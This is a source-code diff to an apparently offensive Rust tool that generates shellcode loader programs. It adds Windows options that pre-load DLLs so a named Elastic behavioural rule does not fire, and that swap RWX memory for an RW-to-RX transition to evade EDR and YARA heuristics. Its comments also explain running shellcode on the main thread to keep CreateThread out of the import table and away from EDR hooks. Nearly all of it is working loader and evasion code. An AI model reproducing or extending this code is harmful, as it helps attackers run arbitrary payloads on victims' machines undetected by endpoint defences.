@@ -41,6 +41,22 @@ pub struct LoaderOpts {
     /// Saves the `core::fmt` decimal-parse code path; useful for
     /// PIC loaders that want every byte to count.
     pub binary_size_holder: bool,
+    /// Windows-only: emit a `LoadLibraryA` call for each name in the
+    /// scaffolded `main()` BEFORE the shellcode runs. The DLL load
+    /// event is then attributed to this signed loader's `.text`
+    /// section instead of the anonymous RWX shellcode region — which
+    /// suppresses Elastic's `Network Module Loaded from Suspicious
+    /// Unbacked Memory` and similar behavioral rules for shellcodes
+    /// that subsequently call `GetModuleHandle("ws2_32")`.
+    /// Empty = no pre-loading.
+    pub pre_load_libs: Vec<String>,
+    /// Windows-only: instead of `VirtualAlloc(PAGE_EXECUTE_READWRITE)`,
+    /// emit the safer two-step pattern: `VirtualAlloc(PAGE_READWRITE)`
+    /// + copy shellcode + `VirtualProtect(PAGE_EXECUTE_READ)`. Avoids
+    /// the "writable + executable in one region" heuristic some EDRs
+    /// (and YARA rules) flag. Slightly louder on the VirtualProtect
+    /// transition itself, so this is a deliberate tradeoff.
+    pub no_rwx: bool,
 }
 
 impl Default for LoaderOpts {
@@ -49,6 +65,8 @@ impl Default for LoaderOpts {
             padding_bytes: DEFAULT_PAD_BYTES,
             randomize_markers: false,
             binary_size_holder: false,
+            pre_load_libs: Vec::new(),
+            no_rwx: false,
         }
     }
 }
@@ -125,11 +143,20 @@ pub fn write_loader_scaffold(
         Markers::default_static(opts.binary_size_holder)
     };
 
-    fs::write(dest.join("Cargo.toml"), cargo_toml(name, platform))?;
+    if !matches!(platform, Platform::Windows) && !opts.pre_load_libs.is_empty() {
+        return Err(anyhow!(
+            "--pre-load-libs is Windows-only (current target: {platform})"
+        ));
+    }
+    if !matches!(platform, Platform::Windows) && opts.no_rwx {
+        return Err(anyhow!("--no-rwx is Windows-only (current target: {platform})"));
+    }
+
+    fs::write(dest.join("Cargo.toml"), cargo_toml(name, platform, &opts))?;
     fs::write(dest.join("build.rs"), build_rs(&markers, opts.padding_bytes))?;
     fs::write(
         dest.join("src/main.rs"),
-        main_rs(platform, &markers, opts.binary_size_holder),
+        main_rs(platform, &markers, &opts),
     )?;
     fs::write(
         dest.join("pumpbin-pack.sh"),
@@ -150,13 +177,24 @@ pub fn write_loader_scaffold(
     Ok(())
 }
 
-fn cargo_toml(name: &str, platform: Platform) -> String {
+fn cargo_toml(name: &str, platform: Platform, opts: &LoaderOpts) -> String {
     let deps = match platform {
-        Platform::Linux => "libc = \"0.2\"",
+        Platform::Linux => "libc = \"0.2\"".to_string(),
         // No Win32_System_Threading — the Windows scaffold runs shellcode
         // on the main thread to keep CreateThread out of the IAT.
-        Platform::Windows => "windows-sys = { version = \"0.59\", features = [\"Win32_Foundation\", \"Win32_System_Memory\"] }",
-        Platform::Darwin => "libc = \"0.2\"",
+        Platform::Windows => {
+            let mut features = vec!["Win32_Foundation", "Win32_System_Memory"];
+            if !opts.pre_load_libs.is_empty() {
+                features.push("Win32_System_LibraryLoader");
+            }
+            let features_csv = features
+                .iter()
+                .map(|f| format!("\"{f}\""))
+                .collect::<Vec<_>>()
+                .join(", ");
+            format!("windows-sys = {{ version = \"0.59\", features = [{features_csv}] }}")
+        }
+        Platform::Darwin => "libc = \"0.2\"".to_string(),
     };
     format!(
         r#"[package]
@@ -196,11 +234,11 @@ fn main() {{
     )
 }
 
-fn main_rs(platform: Platform, markers: &Markers, binary_size_holder: bool) -> String {
+fn main_rs(platform: Platform, markers: &Markers, opts: &LoaderOpts) -> String {
     match platform {
-        Platform::Linux => linux_main_rs(markers, binary_size_holder),
-        Platform::Windows => windows_main_rs(markers, binary_size_holder),
-        Platform::Darwin => linux_main_rs(markers, binary_size_holder),
+        Platform::Linux => linux_main_rs(markers, opts.binary_size_holder),
+        Platform::Windows => windows_main_rs(markers, opts),
+        Platform::Darwin => linux_main_rs(markers, opts.binary_size_holder),
     }
 }
 
@@ -343,13 +381,73 @@ fn main() {{
     )
 }
 
-fn windows_main_rs(markers: &Markers, binary_size_holder: bool) -> String {
-    let accessors = size_holder_accessors(markers, binary_size_holder);
+fn windows_main_rs(markers: &Markers, opts: &LoaderOpts) -> String {
+    let accessors = size_holder_accessors(markers, opts.binary_size_holder);
+
+    // Memory imports + allocation pattern depend on --no-rwx.
+    let (mem_imports, alloc_block) = if opts.no_rwx {
+        (
+            "use windows_sys::Win32::System::Memory::{\n    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE,\n    PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS,\n};",
+            r##"        // Two-step: allocate RW, write shellcode, transition to RX.
+        // Avoids the "RWX in one region" heuristic at the cost of a
+        // VirtualProtect transition event some EDRs flag separately.
+        let exec = VirtualAlloc(
+            ptr::null(),
+            sc.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+        assert!(!exec.is_null(), "VirtualAlloc failed");
+        ptr::copy_nonoverlapping(sc.as_ptr(), exec as *mut u8, sc.len());
+        let mut old: PAGE_PROTECTION_FLAGS = 0;
+        let ok = VirtualProtect(exec, sc.len(), PAGE_EXECUTE_READ, &mut old);
+        assert!(ok != 0, "VirtualProtect RW→RX failed");"##,
+        )
+    } else {
+        (
+            "use windows_sys::Win32::System::Memory::{\n    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,\n};",
+            r##"        let exec = VirtualAlloc(
+            ptr::null(),
+            sc.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+        assert!(!exec.is_null(), "VirtualAlloc failed");
+        ptr::copy_nonoverlapping(sc.as_ptr(), exec as *mut u8, sc.len());"##,
+        )
+    };
+
+    // LoadLibraryA import + pre-load block depend on pre_load_libs.
+    let (libloader_import, preload_block) = if opts.pre_load_libs.is_empty() {
+        (String::new(), String::new())
+    } else {
+        let lines: String = opts
+            .pre_load_libs
+            .iter()
+            .map(|lib| {
+                let name = if lib.ends_with(".dll") {
+                    lib.clone()
+                } else {
+                    format!("{lib}.dll")
+                };
+                format!(
+                    "        let _ = LoadLibraryA(b\"{name}\\0\".as_ptr() as *const u8);\n",
+                )
+            })
+            .collect();
+        (
+            "use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;\n".to_string(),
+            format!(
+                "        // Pre-load DLLs from this signed loader's .text so the DLL\n        // load event is attributed here, not to the RWX shellcode region.\n{lines}",
+            ),
+        )
+    };
+
     format!(
         r##"//! Windows loader scaffold. Embeds a shellcode placeholder, extracts
-//! the runtime length from the size-holder slot, allocates RWX
-//! memory with VirtualAlloc, copies the shellcode in, and calls it
-//! on the MAIN thread via a direct function-pointer call.
+//! the runtime length from the size-holder slot, allocates execution
+//! memory, copies the shellcode in, and calls it on the MAIN thread
+//! via a direct function-pointer call.
 //!
 //! Why not CreateThread: it's IAT-resolved kernel32 and one of the
 //! most-hooked APIs across every EDR. The main-thread direct call
@@ -361,10 +459,8 @@ fn windows_main_rs(markers: &Markers, binary_size_holder: bool) -> String {
 
 use std::hint::black_box;
 use std::ptr;
-use windows_sys::Win32::System::Memory::{{
-    VirtualAlloc, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
-}};
-
+{mem_imports}
+{libloader_import}
 {accessors}
 
 fn main() {{
@@ -372,14 +468,7 @@ fn main() {{
     let sc = &get_shellcode()[..len];
 
     unsafe {{
-        let exec = VirtualAlloc(
-            ptr::null(),
-            sc.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
-        );
-        assert!(!exec.is_null(), "VirtualAlloc failed");
-        ptr::copy_nonoverlapping(sc.as_ptr(), exec as *mut u8, sc.len());
+{preload_block}{alloc_block}
         // Main-thread direct call. NO CreateThread / CreateRemoteThread.
         let f: extern "C" fn() = std::mem::transmute(exec);
         f();
